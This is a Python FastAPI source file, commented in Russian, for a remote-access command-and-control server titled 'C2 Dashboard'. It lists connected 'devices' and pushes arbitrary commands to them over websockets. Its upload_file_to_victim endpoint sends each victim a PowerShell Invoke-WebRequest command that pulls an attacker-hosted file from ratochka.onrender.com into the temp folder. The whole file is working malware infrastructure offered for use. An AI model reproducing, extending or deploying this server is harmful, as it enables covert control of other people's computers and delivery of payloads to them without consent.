import os
import time
from fastapi import FastAPI, WebSocket, UploadFile, File
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Dict

app = FastAPI()

# Хранилище активных сессий: {session_id: {"ws": websocket_obj}}
sessions: Dict[str, dict] = {}

class Command(BaseModel):
    session_id: str
    command: str

@app.get("/", response_class=str)
async def dashboard():
    """Возвращает HTML-интерфейс управления"""
    return """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <title>C2 Dashboard</title>
        <style>
            body { background: #0f172a; color: #e2e8f0; font-family: 'Segoe UI', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
            
            /* Сайдбар со списком устройств */
            .sidebar { width: 250px; background: #1e293b; border-right: 1px solid #334155; display: flex; flex-direction: column; }
            .header { padding: 15px; background: #334155; font-weight: bold; text-align: center; letter-spacing: 1px; }
            .device-list { flex-grow: 1; overflow-y: auto; padding: 10px; }
            .device-item { 
                padding: 10px; margin-bottom: 5px; cursor: pointer; border-radius: 6px; 
                background: #1e293b; border: 1px solid #334155; transition: 0.2s;
                display: flex; align-items: center; gap: 10px;
            }
            .device-item:hover { background: #334155; }
            .device-item.active { background: #2563eb; border-color: #60a5fa; color: white; }
            .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; box-shadow: 0 0 5px #22c55e; }
            
            /* Основная область */
            .main { flex-grow: 1; display: flex; flex-direction: column; padding: 20px; }
            .top-bar { display: flex; justify-content: space-between; margin-bottom: 10px; }
            .console-area { 
                flex-grow: 1; background: #000; border: 1px solid #334155; border-radius: 6px; 
                padding: 10px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; 
                margin-bottom: 10px; color: #a3e635;
            }
            .input-area { display: flex; gap: 10px; }
            input[type="text"] { flex-grow: 1; background: #1e293b; border: 1px solid #334155; color: white; padding: 10px; border-radius: 6px; }
            button { padding: 0 15px; cursor: pointer; border: none; border-radius: 6px; font-weight: bold; }
            .btn-send { background: #22c55e; color: black; }
            .btn-upload { background: #3b82f6; color: white; }
            
            /* Логи */
            .log-line { margin: 2px 0; word-break: break-all; border-bottom: 1px solid #1e293b; padding: 2px; }
            .cmd { color: #60a5fa; }
            .out { color: #e2e8f0; }
            .err { color: #ef4444; }
            .sys { color: #fbbf24; }
        </style>
    </head>
    <body>
        <div class="sidebar">
            <div class="header">DEVICES (<span id="count">0</span>)</div>
            <div class="device-list" id="deviceList"></div>
        </div>
        
        <div class="main">
            <div class="top-bar">
                <h3 id="currentSession" style="margin:0;">Select a device</h3>
                <button onclick="refreshSessions()" style="background:#475569;">Refresh</button>
            </div>
            
            <div class="console-area" id="console"></div>
            
            <div class="input-area">
                <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') sendCmd()">
                <button class="btn-send" onclick="sendCmd()">Run</button>
                <button class="btn-upload" onclick="document.getElementById('fileInput').click()">Upload File</button>
                <input type="file" id="fileInput" style="display:none" onchange="uploadFile()">
            </div>
        </div>

        <script>
            let currentSessionId = null;
            let ws = null;

            function log(msg, type = 'out') {
                const c = document.getElementById('console');
                const d = document.createElement('div');
                d.className = 'log-line ' + type;
                d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
                c.appendChild(d);
                c.scrollTop = c.scrollHeight;
            }

            function updateDevices(sessions) {
                document.getElementById('count').innerText = sessions.length;
                const list = document.getElementById('deviceList');
                list.innerHTML = '';
                sessions.forEach(id => {
                    const div = document.createElement('div');
                    div.className = 'device-item' + (id === currentSessionId ? ' active' : '');
                    div.innerHTML = `<div class="status-dot"></div> ID: ${id.slice(0, 8)}...`;
                    div.onclick = () => connectWS(id);
                    list.appendChild(div);
                });
            }

            function connectWS(sessionId) {
                if (ws) ws.close();
                // Определяем протокол (wss для https, ws для http)
                const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
                const host = window.location.host;
                
                ws = new WebSocket(`${protocol}://${host}/ws/${sessionId}`);
                
                ws.onopen = () => {
                    log(`Connected to ${sessionId}`, 'sys');
                    currentSessionId = sessionId;
                    document.getElementById('currentSession').innerText = sessionId;
                    refreshSessions(); // Обновляем подсветку
                };
                
                ws.onmessage = (event) => {
                    try {
                        const data = JSON.parse(event.data);
                        if(data.output) log(data.output);
                    } catch(e) {
                        log(event.data);
                    }
                };
                
                ws.onclose = () => {
                    log('Disconnected', 'err');
                    currentSessionId = null;
                    refreshSessions();
                };
            }

            function sendCmd() {
                const cmd = document.getElementById('cmdInput').value;
                if (!cmd || !currentSessionId) return;
                
                log(cmd, 'cmd');
                fetch('/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: currentSessionId, command: cmd})
                }).catch(() => log("Failed to send", "err"));
                
                document.getElementById('cmdInput').value = '';
            }

            async function uploadFile() {
                const fileInput = document.getElementById('fileInput');
                const file = fileInput.files[0];
                if (!file || !currentSessionId) return;

                const formData = new FormData();
                formData.append('file', file);
                
                try {
                    const res = await fetch(`/upload/${currentSessionId}`, {method: 'POST', body: formData});
                    const data = await res.json();
                    log(data.message || data.detail, data.ok ? 'sys' : 'err');
                } catch (e) {
                    log('Upload failed', 'err');
                }
            }

            function refreshSessions() {
                fetch('/sessions')
                    .then(r => r.json())
                    .then(updateDevices);
            }

            // Автообновление списка каждые 5 секунд
            setInterval(refreshSessions, 5000);
            refreshSessions();
        </script>
    </body>
    </html>
    """

@app.websocket("/ws/{session_id}")
async def websocket_endpoint(websocket: WebSocket, session_id: str):
    await websocket.accept()
    sessions[session_id]["ws"] = websocket
    sessions[session_id]["last_seen"] = time.time()
    
    try:
        while True:
            # Ждем сообщения от клиента (если нужно)
            data = await websocket.receive_text()
    except Exception:
        pass
    finally:
        if session_id in sessions:
            del sessions[session_id]

@app.post("/cmd")
async def execute_command(cmd_data: Command):
    session_id = cmd_data.session_id
    if session_id not in sessions:
        return {"status": "error", "message": "Session not found"}
    
    ws = sessions[session_id].get("ws")
    if ws:
        await ws.send_text(f"CMD:{cmd_data.command}")
        return {"status": "ok"}
    return {"status": "error", "message": "Connection lost"}

@app.post("/upload/{session_id}")
async def upload_file_to_victim(session_id: str, file: UploadFile = File(...)):
    if session_id not in sessions:
        return {"status": "error", "message": "Session not found"}
    
    # Сохраняем файл локально на сервере
    file_path = os.path.join("uploads", file.filename)
    os.makedirs("uploads", exist_ok=True)
    with open(file_path, "wb") as buffer:
        buffer.write(await file.read())
        
    # Формируем URL для скачивания жертвой
    # Важно: victim должен иметь доступ к этому файлу по HTTP
    download_url = f"https://{app.state.app_host or 'localhost'}:8000/uploads/{file.filename}"
    
    ws = sessions[session_id].get("ws")
    if ws:
        # Команда для Windows PowerShell: скачать файл во временную папку
        cmd = f"powershell -c Invoke-WebRequest -Uri '{download_url}' -OutFile '%TEMP%\\{file.filename}'"
        await ws.send_text(f"FILE_CMD:{cmd}")
        return {"status": "ok", "message": f"Command sent to download {file.filename}"}
    
    return {"status": "error", "message": "Connection lost"}

@app.get("/sessions")
async def get_sessions():
    return list(sessions.keys())

if __name__ == "__main__":
    import uvicorn
    # Указываем хост для генерации ссылок
    app.state.app_host = "ratochka.onrender.com"
    uvicorn.run(app, host="0.0.0.0", port=8000)
